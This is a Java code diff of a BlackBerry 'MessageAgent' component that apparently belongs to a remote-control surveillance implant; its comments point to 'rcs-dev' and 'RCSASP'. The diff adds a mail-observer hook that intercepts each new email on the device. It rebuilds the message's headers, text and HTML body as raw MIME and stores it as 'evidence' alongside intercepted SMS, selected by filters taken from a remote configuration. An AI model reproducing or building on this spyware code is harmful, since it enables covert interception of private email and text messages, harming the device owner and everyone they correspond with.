@@ -11,35 +11,39 @@ package blackberry.agent;
 
 import java.io.UnsupportedEncodingException;
 import java.util.Date;
+import java.util.Enumeration;
 import java.util.Vector;
 
 import javax.wireless.messaging.BinaryMessage;
-import javax.wireless.messaging.Message;
 import javax.wireless.messaging.TextMessage;
 
+import net.rim.blackberry.api.mail.Address;
+import net.rim.blackberry.api.mail.Header;
+import net.rim.blackberry.api.mail.Message;
 import net.rim.blackberry.api.phone.Phone;
 import net.rim.device.api.util.DataBuffer;
 import net.rim.device.api.util.IntHashtable;
 import blackberry.AgentManager;
 import blackberry.Status;
 import blackberry.agent.mail.Filter;
+import blackberry.agent.mail.Mail;
 import blackberry.agent.mail.MailListener;
+import blackberry.agent.mail.MailParser;
 import blackberry.agent.sms.SmsListener;
 import blackberry.config.Conf;
-import blackberry.config.Keys;
 import blackberry.crypto.Encryption;
 import blackberry.debug.Debug;
 import blackberry.debug.DebugLevel;
 import blackberry.evidence.Evidence;
 import blackberry.evidence.EvidenceType;
 import blackberry.evidence.TimestampMarkup;
+import blackberry.interfaces.MailObserver;
 import blackberry.interfaces.SmsObserver;
 import blackberry.utils.Check;
 import blackberry.utils.DateTime;
 import blackberry.utils.Utils;
 import blackberry.utils.WChar;
 
-// TODO: Auto-generated Javadoc
 /*
  * http://rcs-dev/trac/browser/RCSASP/deps/Common/ASP_Common.h
  * 
@@ -65,13 +69,15 @@ import blackberry.utils.WChar;
 /**
  * The Class MessageAgent.
  */
-public final class MessageAgent extends Agent implements SmsObserver {
+public final class MessageAgent extends Agent implements SmsObserver,
+        MailObserver {
 
     //#ifdef DEBUG
     static Debug debug = new Debug("MessageAgent", DebugLevel.VERBOSE);
     //#endif
 
     private static final int SMS_VERSION = 2010050501;
+    private static final int MAIL_VERSION = 2009070301;
 
     protected static final int SLEEPTIME = 5000;
     protected static final int PERIODTIME = 60 * 60 * 1000;
@@ -108,7 +114,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
                 "Wrong Conversion");
         //#endif
 
-        mailListener = new MailListener(this);
+        mailListener = MailListener.getInstance();
         smsListener = SmsListener.getInstance();
         //smsListener.setMessageAgent(this);
     }
@@ -158,10 +164,9 @@ public final class MessageAgent extends Agent implements SmsObserver {
             debug.info("First Run");
             //#endif
             firstRun = false;
-            //smsListener.run();
-            // TODO: solo se mail e' enabled
+
             if (mailEnabled) {
-                mailListener.run();
+                mailListener.retrieveHistoricMails();
             }
         }
 
@@ -190,8 +195,9 @@ public final class MessageAgent extends Agent implements SmsObserver {
             smsListener.addSmsObserver(this);
         }
 
+        //TODO: se l'email e' disabilitata non far partire il listener.
         if (mailEnabled) {
-            mailListener.start();
+            mailListener.addSingleMailObserver(this);
         }
     }
 
@@ -205,7 +211,8 @@ public final class MessageAgent extends Agent implements SmsObserver {
         }
 
         if (mailEnabled) {
-            mailListener.stop();
+            mailListener.removeSingleMailObserver(this);
+            ;
         }
     }
 
@@ -226,11 +233,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
         Check.requires(evidence != null, "log null");
         //#endif
 
-        synchronized (evidence) {
-            evidence.createEvidence(additionalData, logType);
-            evidence.writeEvidence(content);
-            evidence.close();
-        }
+        evidence.atomicWriteOnce(additionalData, logType, content);
 
         //#ifdef DEBUG
         debug.trace("Evidence created");
@@ -262,98 +265,99 @@ public final class MessageAgent extends Agent implements SmsObserver {
             final Prefix token = (Prefix) tokens.elementAt(i);
 
             switch (token.type) {
-            case Prefix.TYPE_IDENTIFICATION:
-                // IDENTIFICATION TAG
-                identification = WChar.getString(conf, token.payloadStart,
-                        token.length, false);
-                //#ifdef DEBUG
-                debug.trace("Type 1: " + identification);
-                //#endif
-                break;
-            case Prefix.TYPE_FILTER:
-                // Filtro (sempre 2, uno COLLECT e uno REALTIME);
-                try {
-                    final Filter filter = new Filter(conf, token.payloadStart,
-                            token.length);
-                    if (filter.isValid()) {
-                        switch (filter.classtype) {
-                        case Filter.CLASS_EMAIL:
-                            //#ifdef DEBUG
-                            debug.info(filter.toString());
-                            //#endif
-
-                            mailEnabled = true;
-                            if (filter.type == Filter.TYPE_COLLECT) {
-                                //#ifdef DEBUG
-                                debug.trace("Filter.TYPE_COLLECT!");
-                                //#endif
-
-                                final Date oldfrom = lastcheckGet("FilterFROM");
-                                final Date oldto = lastcheckGet("FilterTO");
-
-                                if (filter.fromDate.getTime() == oldfrom
-                                        .getTime()
-                                        && filter.toDate.getTime() == oldto
-                                                .getTime()) {
+                case Prefix.TYPE_IDENTIFICATION:
+                    // IDENTIFICATION TAG
+                    identification = WChar.getString(conf, token.payloadStart,
+                            token.length, false);
+                    //#ifdef DEBUG
+                    debug.trace("Type 1: " + identification);
+                    //#endif
+                    break;
+                case Prefix.TYPE_FILTER:
+                    // Filtro (sempre 2, uno COLLECT e uno REALTIME);
+                    try {
+                        final Filter filter = new Filter(conf,
+                                token.payloadStart, token.length);
+                        if (filter.isValid()) {
+                            switch (filter.classtype) {
+                                case Filter.CLASS_EMAIL:
                                     //#ifdef DEBUG
-                                    debug.info("same Mail Collect Filter");
+                                    debug.info(filter.toString());
                                     //#endif
-                                } else {
+
+                                    mailEnabled = true;
+                                    if (filter.type == Filter.TYPE_COLLECT) {
+                                        //#ifdef DEBUG
+                                        debug.trace("Filter.TYPE_COLLECT!");
+                                        //#endif
+
+                                        final Date oldfrom = lastcheckGet("FilterFROM");
+                                        final Date oldto = lastcheckGet("FilterTO");
+
+                                        if (filter.fromDate.getTime() == oldfrom
+                                                .getTime()
+                                                && filter.toDate.getTime() == oldto
+                                                        .getTime()) {
+                                            //#ifdef DEBUG
+                                            debug.info("same Mail Collect Filter");
+                                            //#endif
+                                        } else {
+                                            //#ifdef DEBUG
+                                            debug.warn("Changed collect filter, resetting markup");
+                                            debug.trace("oldfrom: " + oldfrom);
+                                            debug.trace("oldto: " + oldto);
+                                            //#endif
+                                            lastcheckReset();
+                                            lastcheckSet("FilterFROM",
+                                                    filter.fromDate);
+                                            lastcheckSet("FilterTO",
+                                                    filter.toDate);
+                                        }
+                                    }
+
                                     //#ifdef DEBUG
-                                    debug
-                                            .warn("Changed collect filter, resetting markup");
-                                    debug.trace("oldfrom: " + oldfrom);
-                                    debug.trace("oldto: " + oldto);
+                                    debug.trace("put: " + filter.type);
                                     //#endif
-                                    lastcheckReset();
-                                    lastcheckSet("FilterFROM", filter.fromDate);
-                                    lastcheckSet("FilterTO", filter.toDate);
-                                }
+                                    filtersEMAIL.put(filter.type, filter);
+
+                                    break;
+                                case Filter.CLASS_MMS:
+                                    //#ifdef DEBUG
+                                    debug.info(filter.toString());
+                                    //#endif
+                                    filtersMMS.put(filter.type, filter);
+                                    break;
+                                case Filter.CLASS_SMS:
+                                    //#ifdef DEBUG                            
+                                    debug.info(filter.toString());
+                                    //#endif
+                                    smsEnabled = true;
+                                    filtersSMS.put(filter.type, filter);
+                                    break;
+                                case Filter.CLASS_UNKNOWN: // fall through
+                                default:
+                                    //#ifdef DEBUG
+                                    debug.error("unknown classtype: "
+                                            + filter.classtype);
+                                    //#endif
+                                    break;
                             }
-
-                            //#ifdef DEBUG
-                            debug.trace("put: " + filter.type);
-                            //#endif
-                            filtersEMAIL.put(filter.type, filter);
-
-                            break;
-                        case Filter.CLASS_MMS:
-                            //#ifdef DEBUG
-                            debug.info(filter.toString());
-                            //#endif
-                            filtersMMS.put(filter.type, filter);
-                            break;
-                        case Filter.CLASS_SMS:
-                            //#ifdef DEBUG                            
-                            debug.info(filter.toString());
-                            //#endif
-                            smsEnabled = true;
-                            filtersSMS.put(filter.type, filter);
-                            break;
-                        case Filter.CLASS_UNKNOWN: // fall through
-                        default:
-                            //#ifdef DEBUG
-                            debug.error("unknown classtype: "
-                                    + filter.classtype);
-                            //#endif
-                            break;
                         }
+                        //#ifdef DEBUG
+                        debug.trace("Type 2: header valid: " + filter.isValid());
+                        //#endif
+                    } catch (final Exception e) {
+                        //#ifdef DEBUG
+                        debug.error("Cannot filter " + e);
+                        //#endif
                     }
-                    //#ifdef DEBUG
-                    debug.trace("Type 2: header valid: " + filter.isValid());
-                    //#endif
-                } catch (final Exception e) {
-                    //#ifdef DEBUG
-                    debug.error("Cannot filter " + e);
-                    //#endif
-                }
-                break;
+                    break;
 
-            default:
-                //#ifdef DEBUG
-                debug.error("Unknown type: " + token.type);
-                //#endif
-                break;
+                default:
+                    //#ifdef DEBUG
+                    debug.error("Unknown type: " + token.type);
+                    //#endif
+                    break;
             }
         }
 
@@ -433,7 +437,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
         debug.trace("saveLog: " + message);
         //#endif
 
-        final byte[] dataMsg = getDataMessage(message);
+        final byte[] dataMsg = getSmsDataMessage(message);
         //#ifdef DBC
         Check.asserts(dataMsg != null, "saveLog: null dataMsg");
         //#endif
@@ -476,10 +480,10 @@ public final class MessageAgent extends Agent implements SmsObserver {
 
             if (incoming) {
                 from = address;
-                to = getMyAddress();
+                to = getMySmsAddress();
 
             } else {
-                from = getMyAddress();
+                from = getMySmsAddress();
                 to = address;
             }
 
@@ -536,7 +540,7 @@ public final class MessageAgent extends Agent implements SmsObserver {
      * @param dataMsg
      * @return
      */
-    private byte[] getDataMessage(final javax.wireless.messaging.Message message) {
+    private byte[] getSmsDataMessage(final javax.wireless.messaging.Message message) {
 
         byte[] dataMsg = null;
 
@@ -574,19 +578,210 @@ public final class MessageAgent extends Agent implements SmsObserver {
         return dataMsg;
     }
 
-    private String getMyAddress() {
+    private String getMySmsAddress() {
         final String number = Phone.getDevicePhoneNumber(false);
         if (number == null || number.startsWith("Unknown")) {
             return "local";
         }
 
         //#ifdef DBC
-        Check
-                .ensures(number.length() <= 16, "getMyAddress too long: "
-                        + number);
+        Check.ensures(number.length() <= 16, "getMyAddress too long: " + number);
         //#endif
 
         return number;
+    }
+
+    public void onNewMail(final Message message,
+            final int maxMessageSize, final String storeName) {
+
+        //#ifdef DBC
+        Check.requires(message != null, "message != null");
+        Check.requires(storeName != null, "storeName != null");
+        //#endif
+
+        //#ifdef DEBUG
+        debug.trace("saveEvidence: " + message + " name: " + storeName);
+        //#endif
+
+        try {
+
+            final int flags = 1;
+
+            String from = "local";
+            if (storeName.indexOf("@") > 0) {
+                from = storeName;
+            }
+            final String mail = makeMimeMessage(message, maxMessageSize, from);
+            //#ifdef DBC
+            Check.asserts(mail != null, "Null mail");
+            //#endif
+
+            int size = message.getSize();
+            if (size == -1) {
+                size = mail.length();
+            }
+
+            final DateTime filetime = new DateTime(message.getReceivedDate());
+
+            final byte[] additionalData = new byte[20];
+
+            final DataBuffer databuffer = new DataBuffer(additionalData, 0, 20,
+                    false);
+            databuffer.writeInt(MAIL_VERSION);
+            databuffer.writeInt(flags);
+            databuffer.writeInt(size);
+            databuffer.writeLong(filetime.getFiledate());
+            //#ifdef DBC
+            Check.asserts(additionalData.length == 20,
+                    "Mail Wrong buffer size: " + additionalData.length);
+            //#endif
+
+            //#ifdef DEBUG
+            debug.trace("saveEvidence: "
+                    + mail.substring(0, Math.min(mail.length(), 200)));
+            //#endif
+
+            createEvidence(additionalData, mail.getBytes("UTF-8"),
+                    EvidenceType.MAIL_RAW);
+
+            //messageAgent.createLog(additionalData, mail.getBytes("ISO-8859-1"),
+            //      LogType.MAIL_RAW);
+
+        } catch (final Exception ex) {
+            //#ifdef DEBUG
+            debug.error("saveEvidence message: " + ex);
+            //#endif
+
+        }
+
+    }
+
+    private String makeMimeMessage(final Message message,
+            final int maxMessageSize, final String from) {
+        final Address[] addresses;
+
+        final StringBuffer mailRaw = new StringBuffer();
+
+        // costruisce gli header
+        addAllHeaders(message.getAllHeaders(), mailRaw);
+        addFromHeaders(message.getAllHeaders(), mailRaw, from);
+
+        // decode del mime, separo text da html
+        final MailParser parser = new MailParser(message);
+        final Mail mail = parser.parse();
+
+        //#ifdef DEBUG
+        debug.trace("Email size: " + message.getSize() + " bytes");
+        debug.trace("Sent date: " + message.getSentDate());
+        debug.trace("Subject: " + message.getSubject());
+        //debug.trace("Body text: " + message.getBodyText());
+        //#endif
+
+        // comincia la ricostruzione del MIME
+        mailRaw.append("MIME-Version: 1.0\r\n");
+        final long rnd = Math.abs(Utils.randomLong());
+        final String boundary = "------_=_NextPart_" + rnd;
+
+        if (mail.isMultipart()) {
+            mailRaw.append("Content-Type: multipart/alternative; boundary="
+                    + boundary + "\r\n");
+            mailRaw.append("\r\n--" + boundary + "\r\n");
+        }
+
+        if (mail.hasText()) {
+            mailRaw.append(mail.plainTextMessageContentType);
+            String msg = mail.plainTextMessage;
+            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
+                msg = msg.substring(0, maxMessageSize);
+            }
+            mailRaw.append(msg);
+        }
+
+        if (mail.isMultipart()) {
+            mailRaw.append("\r\n--" + boundary + "\r\n");
+        }
+
+        if (mail.hasHtml()) {
+            //mailRaw.append("Content-Transfer-Encoding: quoted-printable\r\n");
+            //mailRaw.append("Content-type: text/html; charset=UTF8\r\n\r\n");
+            mailRaw.append(mail.htmlMessageContentType);
+            mailRaw.append(mail.htmlMessage);
+        }
+
+        if (mail.isMultipart()) {
+            mailRaw.append("\r\n--" + boundary + "--\r\n");
+        }
+
+        // se il mio parser fallisce, uso la decodifica di base fornita dalla classe Message
+        if (mail.isEmpty()) {
+            mailRaw.append("Content-type: text/plain; charset=UTF8\r\n\r\n");
+
+            String msg = message.getBodyText();
+            if (maxMessageSize > 0 && msg.length() > maxMessageSize) {
+                msg = msg.substring(0, maxMessageSize);
+            }
+            mailRaw.append(msg);
+        }
+
+        mailRaw.append("\r\n");
+
+        final String craftedMail = mailRaw.toString();
+
+        return craftedMail;
+    }
+
+    /**
+     * Aggiunge alla mail "raw" generata la lista di header presenti nel Message
+     * originale
+     * 
+     * @param headers
+     * @param mail
+     */
+    private void addAllHeaders(final Enumeration headers,
+            final StringBuffer mail) {
+
+        while (headers.hasMoreElements()) {
+            final Object headerObj = headers.nextElement();
+            if (headerObj instanceof Header) {
+                final Header header = (Header) headerObj;
+                mail.append(header.getName());
+                mail.append(header.getValue());
+                mail.append("\r\n");
+            } else {
+                //#ifdef DEBUG
+                debug.error("Unknown header type: " + headerObj);
+                //#endif
+            }
+        }
+    }
+
+    /**
+     * Il metodo addAllHeaders non estrae il campo from. Occorre specificarglelo
+     * esplicitamente.
+     * 
+     * @param headers
+     * @param mail
+     * @param from
+     */
+    private void addFromHeaders(final Enumeration headers,
+            final StringBuffer mail, final String from) {
+
+        boolean fromFound = false;
+        while (headers.hasMoreElements()) {
+            final Object headerObj = headers.nextElement();
+            if (headerObj instanceof Header) {
+                final Header header = (Header) headerObj;
+                if (header.getName().startsWith("From")) {
+                    fromFound = true;
+                }
+            }
+        }
+        if (!fromFound) {
+            //#ifdef DEBUG
+            debug.info("Adding from: " + from);
+            //#endif
+            mail.append("From: " + from + "\r\n");
+        }
     }
 
 }
